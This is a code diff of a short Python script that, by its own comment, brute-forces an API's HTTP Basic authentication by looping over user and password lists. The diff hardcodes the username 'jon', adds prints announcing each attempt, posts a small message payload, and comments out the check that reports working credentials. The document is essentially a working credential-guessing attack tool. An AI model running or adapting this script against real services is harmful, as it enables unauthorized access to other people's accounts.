@@ -1,6 +1,10 @@
 import requests
 from base64 import b64encode
 
+# this script takes in a userlist and pwlist and 
+# bruteforces an API with 
+# basic authentication headers
+
 passwordList = []
 userList =[]
 
@@ -25,16 +29,22 @@ def tryBrute():
 
         for pwd in passwordList:
 
-            userAndPass = usr + ":" + pwd
+            userAndPass = "jon" + ":" + pwd
+            print("attacking api with " + userAndPass)
             userAndPassEncode = b64encode(userAndPass.encode()).decode("ascii")
             authString = str('Basic %s' %  userAndPassEncode)
+            
             headers = {
             'authorization': authString,
             'cache-control': "no-cache",
             }
-            response = requests.request("POST", url, headers=headers)
-            if response.status_code == 200:
-                print(usr + ":" + pwd)
+            print("sending payload to url: " + url)
+            print("setting the authstring to: " + authString)
+            data = {'sender': 'Patrick', 'receiver': 'Idan', 'message': 'We did it!'}
+
+            response = requests.request("POST", url, data=data, headers=headers)
+            #if response.status_code == 200:
+            #    print(usr + ":" + pwd)
             print(response)
 
 createUserList(userdict)
